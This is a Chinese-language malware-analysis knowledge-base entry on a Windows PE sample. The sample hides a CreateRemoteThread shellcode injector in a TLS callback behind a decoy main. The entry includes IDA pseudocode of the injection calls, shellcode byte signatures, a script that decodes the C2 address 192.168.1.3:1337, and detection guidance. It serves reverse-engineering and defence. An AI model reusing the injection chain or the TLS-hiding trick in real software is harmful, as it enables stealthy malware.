---
id: code-analysis-reverse-windows-pe-tls-callback-decoy-main-remote-thread-injection
title: PE TLS Callback 隐藏注入器：诱饵 main + 进程快照 + CreateRemoteThread 注入 shellcode
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: pe-tls-callback-decoy-main-remote-thread-injection
tags:
- malware
- reverse
- windows
- pe
- tls-callback
- process-injection
- shellcode
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:53:35+08:00'
  notes: 已对照原文与图 10/12/14/16/18 核对：诱饵 main、TlsCallback_0、进程快照遍历、OpenProcess(0x43A)、VirtualAllocEx/WriteProcessMemory/CreateRemoteThread、shellcode 特征与 192.168.1.3:1337 均一致；未运行样本。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-pe-tls-callback-decoy-main-remote-thread-injection/
draft: false
kb_aliases:
- TLS Callback 注入器
- 诱饵 main
- Never executed main LOL
- Classic Remote Thread Injection
- 进程快照注入
---

## 一句话结论

样本的 `main` 只打印 `Never executed main LOL` 并 `ExitProcess(0)`，真正逻辑藏在 `TlsCallback_0`：它用 `CreateToolhelp32Snapshot/Process32First/Next` 按进程名找 PID，`OpenProcess(0x43A)` 打开目标，`VirtualAllocEx → WriteProcessMemory → CreateRemoteThread` 注入 `unk_140021000` 处的 x64 shellcode；shellcode 里的 `mov r12, imm64` 立即数可直接解出 C2 的 `192.168.1.3:1337`。

## 原理

- **诱饵 main**：正常程序不会在 `main` 里只弹一句“从未执行过 main”就退出；这是恶意样本常见的反分析/混淆手法，用来让只跟 `main` 的分析者错过真正入口。
- **TLS Callback 提前执行**：PE 的 TLS 目录可在 OEP/main 之前调用回调；样本把注入逻辑放在 `TlsCallback_0`，因此即使 `main` 是空的，恶意代码仍会运行。
- **进程发现**：`sub_1400010B0(".exe")` 内部用 `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)`、`Process32First/Next` 遍历进程，`lstrcmpiA(lpString1, pe.szExeFile)` 做不区分大小写匹配，返回 `th32ProcessID`。
- **注入三件套**：`OpenProcess(0x43A, 0, pid)` 获取句柄（权限掩码包含注入所需权限）；`VirtualAllocEx(hProcess, NULL, nSize, 0x1000, 0x20)` 分配可执行内存；`WriteProcessMemory` 写 shellcode；`CreateRemoteThread` 以分配地址为入口启动远程线程；`WaitForSingleObject`/`CloseHandle` 收尾。
- **shellcode 分析**：`unk_140021000` 以 `FC 48 83 E4 F0`（cld + 栈对齐）开头，随后 `65 48 8B 52 60`（GS:[60h] 取 PEB）遍历模块链表找 kernel32/ntdll，字符串中出现 `ws2_32`，说明会动态加载 Winsock；`49 BC 02 00 05 39 C0 A8 01 03` 是 `mov r12, imm64`，立即数拆为 `AF_INET`、端口 `0x0539=1337`、IP `192.168.1.3`。
- **意图证据**：MessageBox 文本 `Searching for process`/`Process Found`/`Injecting in process`、标题 `Injection`，以及样本自证字符串，都是强主观意图证据。

## 触发条件

- PE 样本 `main` 为空/只打印诱饵字符串并退出；函数列表中存在 `TlsCallback_0`。
- 导入表/代码中出现 `CreateToolhelp32Snapshot`、`Process32First/Next`、`OpenProcess`、`VirtualAllocEx`、`WriteProcessMemory`、`CreateRemoteThread`。
- `.data`/`.rdata` 中有大块高熵数据（shellcode/DLL），以 `FC 48 83 E4 F0`、`65 48 8B 52 60` 等 x64 shellcode 序言开头。
- MessageBox/字符串暴露“Injection/Process Found”等意图。

## 利用步骤

1. 用 IDA/Ghidra 打开 PE，检查 `main` 是否为空/诱饵；查看 TLS 目录和 `TlsCallback_0`。
2. 跟进进程查找函数，确认匹配的进程名（`.exe`）和 PID 返回逻辑。
3. 跟进注入函数，确认 `OpenProcess` 权限、`VirtualAllocEx` 保护属性（0x20/0x40）、`WriteProcessMemory` 源地址与大小、`CreateRemoteThread` 入口。
4. dump `unk_140021000` 的 shellcode，按 x64 反汇编；搜索 `ws2_32`、`PEB`、`mov reg, imm64` 等特征。
5. 解析网络参数：`02 00` AF_INET、`05 39` 端口、`C0 A8 01 03` IP；本题得到 `192.168.1.3:1337`。
6. 在隔离环境/沙箱中动态验证（可选）：监控进程创建、远程线程、网络连接；不要在生产机运行样本。

## PoC

```python
# 从 shellcode 中提取 IP/端口（按样本的 mov r12, imm64 模式）
import struct
sc = bytes.fromhex("49 BC 02 00 05 39 C0 A8 01 03")
imm = sc[2:10]
family, port, ip = struct.unpack("<HH4s", imm)
print(hex(family), port, ".".join(map(str, ip)))  # 0x2 1337 192.168.1.3
```

```c
// 注入核心（IDA 伪代码示意）
v6 = VirtualAllocEx(hProcess, 0, nSize, 0x1000, 0x20);
WriteProcessMemory(hProcess, v6, lpBuffer, nSize, 0);
hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)v6, 0, 0, 0);
WaitForSingleObject(hThread, 0x1F4);
```

说明：PoC 仅做静态解析，不在本机执行样本；未对附件复跑。

## 变体与关联

- **入口隐藏**：TLS Callback、DllMain、SEH/VEH、shellcode 直接跳转；参见 [[code-analysis-reverse-windows-pe-tls-callback-pre-oep]]。
- **注入方式**：Classic Remote Thread、APC、进程镂空、反射 DLL、sRDI；参见 [[pentest-c2-srdi-reflective-dll-injection-shellcode-loader]]。
- **进程选择**：按进程名、PID、窗口名、父进程筛选；可注入 svchost/explorer 等。
- **网络参数**：`AF_INET`/`AF_INET6`、端口、IP 可能被编码/异或；按 shellcode 实际指令解析。
- **关联**：[[pentest-c2-staged-downloader-multi-target-injection-veh-fallback]]（多目标注入回退）、[[pentest-c2-pic-shellcode-text-peb-eat-http-loader]]（PEB/EAT 自解析 shellcode）。

## 检测与防御

- **静态检测**：PE TLS 目录非空 + 空/诱饵 main + 注入 API 组合；YARA 匹配 `Never executed main`、`Injection` MessageBox、`ws2_32` shellcode 特征。
- **动态检测**：Sysmon/EDR 监控 `CreateRemoteThread`、`VirtualAllocEx` 跨进程写、进程快照枚举、可疑外连；对 `OpenProcess` 高权限掩码告警。
- **防御**：启用 ASR/EDR 远程线程创建阻断、限制跨进程写、最小权限运行、应用白名单；不要运行来历不明的 PE。
- **取证**：保留样本哈希、TLS 回调、shellcode dump、网络目标；在隔离环境分析。
